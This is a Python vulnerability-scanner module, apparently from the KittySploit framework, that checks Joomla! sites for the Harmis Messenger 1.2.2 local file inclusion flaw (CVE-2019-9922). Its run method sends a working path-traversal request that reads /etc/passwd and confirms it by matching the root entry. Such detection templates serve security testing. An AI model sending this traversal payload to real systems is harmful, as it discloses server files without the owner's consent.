#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla! Harmis Messenger 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Harmis Messenger 1.2.2 - Local File Inclusion Detection',
        'description': 'Joomla! Harmis Messenger 1.2.2 is vulnerable to local file inclusion which could give an attacker read access to arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'joomla', 'messenger', 'lfi', 'harmistechnology', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/azd-cert/CVE/blob/master/CVEs/CVE-2019-9922.md',
            'https://extensions.joomla.org/extension/je-messenger/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-9922',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/azd-cert/CVE',
        ],
        'cve': 'CVE-2019-9922',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Harmis Messenger 1.2.2 - Local File Inclusion detected",
                path='/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd',
            )
            return True
        return False

